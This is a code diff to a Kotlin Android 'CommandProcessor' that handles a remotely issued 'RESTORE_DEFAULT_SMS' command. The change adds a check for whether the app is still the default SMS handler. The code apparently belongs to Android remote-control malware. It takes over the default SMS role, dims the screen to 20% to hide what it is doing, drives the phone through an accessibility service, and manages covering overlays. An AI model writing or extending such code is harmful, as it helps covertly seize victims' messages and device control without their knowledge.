@@ -589,32 +589,39 @@ object CommandProcessor {
                 }
                 "RESTORE_DEFAULT_SMS" -> {
                     DefaultSmsManager.pendingCmdId = id
-                    val prevLabel = DefaultSmsManager.getStoredPreviousLabel(ctx)
-                    if (prevLabel == null) {
-                        status = "FAILED"
-                        errorMsg = "No previous SMS package found in memory."
+                    
+                    if (!DefaultSmsManager.isDefaultSms(ctx)) {
+                        status = "ALREADY_RESTORED"
+                        errorMsg = "App is already not the default SMS."
+                        DefaultSmsManager.expectedMode = ""
                     } else {
-                        DefaultSmsManager.expectedMode = "RESTORE"
-                        Handler(Looper.getMainLooper()).post {
-                            DimmerManager.applyDim(ctx, 20, "AUTO") // DEBUG: 20% visibility
-                                                Handler(Looper.getMainLooper()).postDelayed({
-                        if (DefaultSmsManager.expectedMode == "RESTORE") {
-                            DefaultSmsManager.expectedMode = ""
-                            MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
-                            DynamicUIManager.removeOverlay(ctx, "SMS_RESTORE_SAFETY_FUSE")
-                        }
-                    }, 30000)
-                        }
-                        try {
-                            val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
-                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                            }
-                            ctx.startActivity(i)
-                            status = "RESTORE_INITIATED"
-                            errorMsg = "Targeting: $prevLabel"
-                        } catch (e: Exception) {
+                        val prevLabel = DefaultSmsManager.getStoredPreviousLabel(ctx)
+                        if (prevLabel == null) {
                             status = "FAILED"
-                            errorMsg = "Intent failed: ${e.message}"
+                            errorMsg = "No previous SMS package found in memory."
+                        } else {
+                            DefaultSmsManager.expectedMode = "RESTORE"
+                            Handler(Looper.getMainLooper()).post {
+                                DimmerManager.applyDim(ctx, 20, "AUTO") // DEBUG: 20% visibility
+                                                    Handler(Looper.getMainLooper()).postDelayed({
+                                if (DefaultSmsManager.expectedMode == "RESTORE") {
+                                    DefaultSmsManager.expectedMode = ""
+                                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                                    DynamicUIManager.removeOverlay(ctx, "SMS_RESTORE_SAFETY_FUSE")
+                                }
+                            }, 30000)
+                            }
+                            try {
+                                val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
+                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                                }
+                                ctx.startActivity(i)
+                                status = "RESTORE_INITIATED"
+                                errorMsg = "Targeting: $prevLabel"
+                            } catch (e: Exception) {
+                                status = "FAILED"
+                                errorMsg = "Intent failed: ${e.message}"
+                            }
                         }
                     }
                 }
